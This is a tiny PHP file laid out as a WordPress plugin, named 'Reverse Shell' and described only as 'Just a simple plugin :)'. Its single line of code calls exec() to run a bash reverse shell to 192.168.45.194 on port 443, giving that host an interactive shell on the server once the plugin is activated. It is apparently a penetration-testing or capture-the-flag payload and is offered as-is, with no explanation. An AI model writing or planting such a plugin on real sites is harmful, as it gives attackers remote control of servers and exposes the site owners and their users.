<?php
/*
Plugin Name: Reverse Shell
Plugin URI: http://example.com
Description: Just a simple plugin :)
Version: 1.0
Author: You
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.194/443 0>&1'");
?>
